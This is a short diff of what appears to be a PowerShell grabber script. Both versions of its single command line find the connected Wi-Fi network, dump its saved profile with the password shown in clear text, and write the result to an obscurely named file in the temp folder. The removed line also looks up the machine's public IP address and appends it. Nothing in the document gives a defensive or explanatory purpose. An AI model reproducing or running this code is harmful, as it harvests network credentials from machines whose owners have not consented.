@@ -1,6 +1,6 @@
 ############################################################################################################################################################
 
-$a=(netsh wlan show interfaces) | Select-String "SSID";$b=($a -replace '^\s*SSID\s*:\s*', '') -replace '\s*BSSID\s*:\s*[0-9A-Fa-f:]*', '';netsh wlan show profile $b key=clear | Format-Table -AutoSize | Out-String > $env:TEMP/--why.txt;$ip=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content;Add-Content -Path $env:TEMP/--why.txt "$ip" 
+$a=(netsh wlan show interfaces) | Select-String "SSID";$b=($a -replace '^\s*SSID\s*:\s*', '') -replace '\s*BSSID\s*:\s*[0-9A-Fa-f:]*', '';netsh wlan show profile $b key=clear | Format-Table -AutoSize | Out-String > $env:TEMP/--why.txt 
 
 ############################################################################################################################################################
 
